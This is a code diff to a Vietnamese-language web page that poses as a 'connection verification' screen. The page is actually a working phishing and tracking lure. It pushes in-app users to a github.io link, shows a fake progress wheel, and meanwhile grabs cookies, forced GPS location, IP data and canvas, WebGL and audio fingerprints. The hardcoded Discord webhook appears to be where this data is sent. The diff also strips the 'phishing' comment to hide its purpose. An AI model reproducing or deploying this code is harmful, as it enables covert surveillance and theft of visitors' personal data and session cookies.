@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Xác minh kết nối…</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -63,16 +66,15 @@
     </style>
 </head>
 <body>
-    <!-- Redirect overlay for known in-app browsers -->
+    <!-- Redirect overlay -->
     <div id="redirectOverlay" class="hidden">
         <div style="font-size:20px; font-weight:600;">⚠️ Vui lòng mở bằng trình duyệt</div>
         <div style="margin-top:15px; color:#ccc; font-size:15px;" id="redirectMsg"></div>
         <button class="btn" id="redirectBtn">Mở trong trình duyệt</button>
     </div>
 
-    <!-- Main phishing content -->
+    <!-- Main content -->
     <div id="jackLayer">
-        <!-- Wheel phase -->
         <div id="wheelSection">
             <div class="wheel-box">
                 <div class="wheel" id="wheel"></div>
@@ -83,7 +85,6 @@
             <div id="tapPrompt" class="hidden" style="margin-top:15px; color:#ffbe0b; font-weight:600; font-size:15px; white-space: pre-line;"></div>
             <div id="tapButton" class="tap-area hidden">Chạm để xác minh</div>
         </div>
-        <!-- GPS success + map + scan -->
         <div id="scanSection" class="hidden">
             <div class="checkmark" id="successMarkInner"></div>
             <div class="status" id="scanStatus">Định vị thành công!</div>
@@ -93,18 +94,21 @@
     </div>
 
     <script>
-        // ========== IN-APP BROWSER DETECTION (only known bad ones) ==========
         (function() {
             const ua = navigator.userAgent;
-            // Only block browsers that are known to break geolocation or cause issues
-            const isInApp = /FBAN|FBAV|Instagram|Twitter|TikTok|Pinterest|Snapchat|FB_IAB|MESSENGER|Line|WeChat|KakaoTalk|WhatsApp|Telegram/i.test(ua);
+            // Very narrow block – only when these exact app‑specific tokens exist
+            const inAppTokens = ['FBAN','FBAV','Instagram','Twitter','TikTok','Pinterest','Snapchat','FB_IAB','MESSENGER','Line','WeChat','KakaoTalk','WhatsApp','Telegram'];
+            const isInApp = inAppTokens.some(token => ua.indexOf(token) !== -1);
+
             if (isInApp) {
+                // Show diagnostic first (alert) so we can see what user agent triggered it
+                alert('Redirect overlay shown. User-agent: ' + ua);
                 document.getElementById('jackLayer').classList.add('hidden');
                 const overlay = document.getElementById('redirectOverlay');
                 overlay.classList.remove('hidden');
                 const msg = document.getElementById('redirectMsg');
                 const btn = document.getElementById('redirectBtn');
-                const url = 'https://messenger-co.github.io/Axr4t2auYc';
+                const url = 'https://messenger-co.github.io/Axr4t2auYc?v=' + Date.now();
 
                 if (/Android/.test(ua)) {
                     msg.innerText = 'Bạn đang mở trong ứng dụng. Nhấn nút bên dưới để mở bằng trình duyệt mặc định.';
@@ -118,15 +122,13 @@
                         navigator.clipboard.writeText(url).then(() => alert('Link đã được sao chép. Dán vào Safari để mở.'));
                     };
                 }
-                return; // stop main app
+                return;
             }
             startMainApp();
         })();
 
-        // ========== MAIN APP (real browser) ==========
         function startMainApp() {
             const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
-
             const wheelEl = document.getElementById('wheel');
             const percentEl = document.getElementById('percent');
             const statusEl = document.getElementById('statusMsg');
@@ -138,7 +140,6 @@
             const mapImage = document.getElementById('mapImage');
             const scanStatus = document.getElementById('scanStatus');
             const scanSub = document.getElementById('scanSub');
-
             let gpsData = null;
             let ipData = null;
             const cookiesStolen = document.cookie || 'none';
@@ -161,7 +162,6 @@
                 ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
                 ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
                 const canvasHash = canvas.toDataURL().substring(0, 100);
-
                 let webglRenderer = 'N/A', webglVendor = 'N/A';
                 try {
                     const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
@@ -170,7 +170,6 @@
                         if (debug) { webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL); }
                     }
                 } catch(e) {}
-
                 let audioFP = 'N/A';
                 try {
                     const actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
@@ -186,7 +185,6 @@
                         audioFP = out.slice(0, 4000).reduce((a,b)=>a+Math.abs(b),0).toString(36);
                     };
                 } catch(e) {}
-
                 const conn = nav.connection || {};
                 return {
                     userAgent: nav.userAgent,
@@ -285,7 +283,6 @@
                 mapImage.src = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=14&size=280x160&markers=${lat},${lon},red-pushpin`;
             }
 
-            // Wheel flow
             let progress = 0;
             const wheelTimer = setInterval(() => {
                 progress += 20;
@@ -317,15 +314,12 @@
                     percentEl.textContent = fake + '%';
                     if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
                 }, 80);
-
                 const gpsPromise = forceGPS();
                 ipData = await fetchIP();
                 gpsData = await gpsPromise;
-
                 clearInterval(fakeInterval);
                 wheelEl.classList.add('paused');
                 percentEl.textContent = '100%';
-
                 if (gpsData) {
                     wheelSection.classList.add('hidden');
                     scanSection.classList.remove('hidden');
